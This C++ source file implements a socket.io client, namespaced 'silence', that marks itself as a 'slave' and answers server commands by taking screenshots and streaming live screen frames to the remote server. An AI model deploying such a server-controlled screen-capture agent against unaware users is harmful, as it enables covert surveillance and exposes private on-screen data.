#include <Client.h>

#define SIOSTR(str) sio::string_message::create(str)

namespace silence
{
    Client::Client(const std::string &url)
        : BaseClient(url)
    {
        // bind events
        BaseClient::bindEvent("command",
                              std::bind(&Client::onCommand,
                                        this, std::placeholders::_1,
                                        std::placeholders::_2,
                                        std::placeholders::_3, std::placeholders::_4));
    }

    void Client::onFailed()
    {
        std::cout << "sio failed" << std::endl;
        exit(-1);
    }

    void Client::onClosed(sio::client::close_reason const &reason)
    {
        std::cout << "sio closed" << std::endl;
        exit(0);
    }

    sio::message::list
    Client::createObject(const std::map<std::string, sio::message::ptr> &object)
    {
        auto obj = sio::object_message::create();
        obj.get()->get_map() = object;
        return obj;
    }

    void Client::onCommand(std::string const &name,
                           sio::message::ptr const &data,
                           bool hasAck,
                           sio::message::list &ack_resp)
    {
        auto commandObject = data->get_map();
        std::string event = commandObject["event"]->get_string();

        if (event == "whois")
        {
            std::thread thread(std::bind(&Client::whoisEvent, this));
            thread.detach();
        }
        else if (event == "start_stream")
        {
            std::thread thread(std::bind(&Client::startStreamEvent, this));
            thread.detach();
        }
        else if (event == "kill_stream")
        {
            std::thread thread(std::bind(&Client::killStreamEvent, this));
            thread.detach();
        }
        else if (event == "screenshot")
        {
            std::thread thread(std::bind(&Client::screenshotEvent, this));
            thread.detach();
        }
        else
        {
            std::thread thread(std::bind(&Client::errorEvent, this, std::placeholders::_1,
                                         std::placeholders::_2),
                               event, "Invalid event");
            thread.detach();
        }
    }

    void Client::whoisEvent()
    {
        mSocket->emit("system",
                      createObject({{"isSlave", sio::bool_message::create(true)}}));
    }

    void Client::screenshotEvent()
    {
        impl::Screenshot screen;
        cv::Mat image{screen.take()};

        mSocket->emit("screenshot",
                      impl::toBinaryString(image));
    }

    void Client::killStreamEvent()
    {
        std::unique_lock<std::mutex> lockGuard(mStreamLocker);

        if (!mStreamRunning)
        {
            errorEvent("killStream", "Stream is already killed");
            return;
        }

        mStreamRunning = false;
        infoEvent("Successfully killed stream");
    }

    void Client::startStreamEvent()
    {
        std::unique_lock<std::mutex> lockGuard(mStreamLocker);
        mStreamRunning = true;
        lockGuard.unlock();

        impl::Screenshot screen;
        while (true)
        {
            lockGuard.lock();
            if (!mStreamRunning)
                return;
            lockGuard.unlock();

            cv::Mat image{screen.take()};
            mSocket->emit("frame",
                          impl::toBinaryString(image));
        }
    }

    void Client::errorEvent(const std::string &event, const std::string &msg)
    {
        mSocket->emit("error", createObject({{"event", SIOSTR(event)},
                                             {"msg", SIOSTR(msg)}}));
    }

    void Client::infoEvent(const std::string &info)
    {
        mSocket->emit("info", createObject({{"msg", SIOSTR(info)}}));
    }
}